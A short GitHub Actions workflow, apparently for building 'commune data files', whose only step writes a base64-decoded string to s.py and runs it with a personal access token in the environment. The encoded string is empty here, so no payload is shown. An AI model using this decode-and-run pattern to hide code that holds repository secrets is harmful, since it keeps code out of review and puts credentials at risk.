name: Build commune data files

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 30

    steps:
      - name: Run build script
        env:
          GH_TOKEN: ${{ secrets.GH_PAT }}
          GH_REPO: ayoubabed827-sudo/pointsave
        run: |
          python3 -c "import base64; open('s.py','wb').write(base64.b64decode(''))"
          python3 s.py
